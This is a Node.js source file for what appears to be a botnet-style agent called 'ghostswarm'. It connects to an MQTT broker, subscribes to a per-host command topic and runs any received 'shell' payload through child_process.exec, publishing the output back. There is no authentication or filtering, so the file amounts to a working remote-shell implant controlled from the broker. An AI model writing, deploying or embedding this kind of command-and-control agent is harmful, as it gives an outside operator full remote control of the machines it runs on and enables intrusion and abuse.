const mqtt = require('mqtt');
const { exec } = require('child_process');

const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';

const fs = require("fs");

let botId;
try {
   botId = fs.readFileSync("/host_hostname", "utf8").trim();
} catch {
   botId = require("os").hostname(); // fallback
}

console.log(`🤖 [${botId}] connecting to MQTT broker at ${MQTT_BROKER}`);
const mqttClient = mqtt.connect(MQTT_BROKER);

mqttClient.on('connect', () => {
   console.log(`🤖 [${botId}] connected to MQTT`);
   const topic = `ghostswarm/${botId}/command`;
   mqttClient.subscribe(topic, { qos: 1 }, (err) => {
      if (err) {
         console.error(`❌ [${botId}] failed to subscribe:`, err);
      } else {
         console.log(`📡 [${botId}] subscribed to ${topic}`);
      }
   });
});

mqttClient.on('message', (topic, message) => {
   try {
      const payload = JSON.parse(message.toString());
      console.log(`📥 [${botId}] received:`, payload);

      const statusTopic = `ghostswarm/${botId}/status`;

      // Handle different message types
      if (payload.type === 'shell' && payload.cmd) {
         // Execute shell command
         exec(payload.cmd, (err, stdout, stderr) => {
            mqttClient.publish(statusTopic, JSON.stringify({
               requestId: payload.requestId,
               output: err ? stderr || 'Command failed' : stdout.trim(),
               status: err ? 'error' : 'ok',
               time: Date.now()
            }));
            console.log(`📤 [${botId}] shell command executed and responded`);
         });
      } else {
         // General echo response for non-shell commands
         mqttClient.publish(statusTopic, JSON.stringify({
            received: payload,
            status: "ok",
            time: Date.now()
         }));
         console.log(`📤 [${botId}] responded to status`);
      }
   } catch (err) {
      console.error(`❌ [${botId}] failed to handle message`, err);

      // Send error response
      const statusTopic = `ghostswarm/${botId}/status`;
      mqttClient.publish(statusTopic, JSON.stringify({
         status: "error",
         error: err.message,
         time: Date.now()
      }));
   }
});
